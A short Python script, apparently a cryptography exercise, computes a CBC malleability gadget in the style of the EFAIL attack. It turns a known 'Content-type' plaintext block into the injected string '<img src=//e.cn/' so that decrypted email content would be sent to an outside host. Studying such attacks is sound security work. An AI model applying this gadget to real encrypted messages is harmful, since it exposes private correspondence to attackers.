iv = 0x70ccb336fed2ff10819a78aa36fd7c22
c0 = 0x4ca5de51dea18d73bcb557cf189e120d

chosenPlaintext = '<img src=//e.cn/'
# print(convertToHex(chosenPlaintext))
chosenPlaintextHex = 0x3c696d67207372633d2f2f652e636e2f

originalPlaintext = 'Content-type: mu'
# print(convertToHex(originalPlaintext))
originalPlaintextHex = 0x436f6e74656e742d747970653a206d75


# Convert plaintext into hex representation
def convertToHex(string):
	temp = ""

	for c in string:
		temp = temp + format(ord(c), "x")

	return temp

# Perform XOR operation on x and y
def xor(x, y):
	return x^y

# Building the CBC gadget:
# Should return P_0' = 0...0 -> P_0' = C_0 ^ P_0 ^ P_C
# P_C = Chosen Plaintext 
# P_0 = Known Plaintext

# cbcGadget = format(xor(iv, originalPlaintextHex), "x")
# print(cbcGadget)
cbcGadget = 0x33a3dd429bbc8b3df5e308cf0cdd1157

# payload = format(xor(cbcGadget, chosenPlaintextHex), "x")
# print(payload)
payload = 0xfcab025bbcff95ec8cc27aa22be7f78

